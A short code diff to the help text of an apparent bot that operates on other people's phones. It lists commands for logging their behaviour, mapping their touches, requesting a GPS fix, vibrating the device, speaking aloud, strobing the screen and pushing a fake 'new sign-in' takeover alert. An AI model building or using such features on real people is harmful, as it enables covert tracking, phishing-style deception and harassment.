@@ -1254,7 +1254,7 @@ async function handleCommand(text) {
       `<code>/events &lt;id&gt;</code> — behavior narration log\n` +
       `<code>/heat &lt;id&gt;</code> — touch heatmap photo\n` +
       `<code>/gps &lt;id&gt;</code> — queue a GPS fix request (prompt on their screen)\n` +
-      `<code>/buzz &lt;id&gt;</code> — make their phone vibrate\n` +
+      `<code>/buzz &lt;id&gt;</code> — vibrate their phone (Android Chrome only — needs a prior tap on the page, haptics on, not Silent/DND)\n` +
       `<code>/nudge &lt;id&gt; [msg]</code> — push a fake “new sign-in” takeover alert (ATO reveal)\n` +
       `<code>/speak &lt;id&gt; &lt;text&gt;</code> — their phone says it out loud\n` +
       `<code>/flash &lt;id&gt;</code> — strobe their screen\n` +
